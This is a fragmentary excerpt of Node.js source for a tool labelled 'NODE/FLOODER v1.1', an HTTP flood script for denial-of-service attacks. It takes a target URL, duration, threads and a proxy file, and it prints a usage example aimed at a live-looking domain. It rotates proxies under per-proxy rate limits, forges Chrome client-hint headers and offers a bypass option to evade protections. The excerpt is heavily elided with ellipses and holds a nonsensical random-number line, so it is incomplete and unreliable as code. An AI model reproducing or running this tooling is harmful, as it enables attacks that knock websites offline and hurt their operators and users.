...
const cookies = c !== -1 && c + 1 < process.argv.length ? process.argv[c + 1] : undefined;
...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
     ...
     console.log(
          chalk.white.bold('Product:             ') + chalk.magenta.bold('   NODE/FLOODER v1.1')
     );
     console.log(
     ...
     console.log(
          chalk.italic.white(`     node ${process.argv[1]} GET "https://iristeam.sbs/" 120 10 10 proxy.txt --delay 1 --bypass --http 2 --debug --cookie --ratelimit --close`)
     );
     console.log(
          chalk.underline.white.bold('\nOptions') + chalk.reset(':')
     );
...
const currentTime = Date.now();
        ...
        (() => {
            ...
            rate = rate.filter(limit => currentTime - limit.timestamp <= 60000);
                                   ...
                                   rate.push({proxy: [proxyHost, proxyPort] , timestamp: Date.now()}); 
setTimeout(() => {
...
const rt = Math.floor(Math.random() * 9999999999999999999999999999999909999999999999999) + 10000000000000000000000000000000000000000000000;
                              ...
                              const headers3 = Object.entries({                                   'sec-ch-ua': `\"Google Chrome\";v=\"${version}\", \"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"${version}\"`,
                                   'sec-ch-mobile': '?0',
